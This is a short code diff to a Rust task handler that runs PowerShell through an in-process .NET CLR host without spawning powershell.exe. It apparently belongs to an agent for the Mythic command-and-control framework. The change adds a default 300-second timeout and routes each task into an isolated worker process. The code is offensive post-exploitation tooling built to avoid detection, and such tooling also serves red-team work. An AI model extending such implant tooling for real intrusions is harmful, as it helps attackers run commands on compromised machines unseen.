@@ -1,4 +1,4 @@
-//! Execute PowerShell through rustclr's in-process CLR host.
+//! Execute PowerShell through rustclr in an isolated worker process.
 //!
 //! Windows only. This avoids spawning `powershell.exe`; it relies on
 //! `System.Management.Automation` being available to the .NET runtime.
@@ -7,8 +7,15 @@ use mythic::{TaskMessage, TaskResponse};
 use serde::Deserialize;
 
 #[derive(Deserialize)]
+#[cfg_attr(not(windows), allow(dead_code))]
 struct Params {
     command: String,
+    #[serde(default = "default_timeout")]
+    timeout: u64,
+}
+
+const fn default_timeout() -> u64 {
+    300
 }
 
 pub fn handle(task: &TaskMessage) -> TaskResponse {
@@ -29,6 +36,10 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
 
     #[cfg(windows)]
     {
+        if !crate::worker::in_worker() {
+            return crate::worker::run_isolated_task(task, params.timeout);
+        }
+
         let pwsh = match rustclr::PowerShell::new() {
             Ok(p) => p,
             Err(e) => {
